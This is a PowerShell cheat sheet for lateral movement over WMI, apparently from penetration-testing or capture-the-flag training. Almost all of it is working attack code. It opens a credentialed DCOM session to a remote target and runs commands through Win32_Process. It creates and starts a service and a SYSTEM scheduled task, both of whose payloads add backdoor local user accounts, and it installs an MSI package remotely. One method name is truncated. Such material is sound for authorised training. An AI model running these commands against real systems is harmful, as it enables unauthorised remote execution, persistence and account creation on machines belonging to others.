# Credential WMI From Powershell
$username = Read-Host -Prompt "Target Username";
$password = Read-Host -Prompt "Target Password";
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

#Create Session WMI From Powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

#Remote Process Creation Using WMI

$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}

# Creating Services Remotely with WMI

Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "GreyService2";
DisplayName = "GreyService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

## To start Service

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'GreyService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartServic

## To stop and Delete Service

Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete

# Creating Scheduled Tasks Remotely with WMI

#Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "GREYtask2"
Start-ScheduledTask -CimSession $Session -TaskName "GREYtask2"

# To delete the scheduled task

Unregister-ScheduledTask -CimSession $Session -TaskName "GREYtask2"


# Installing MSI packages through WM

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
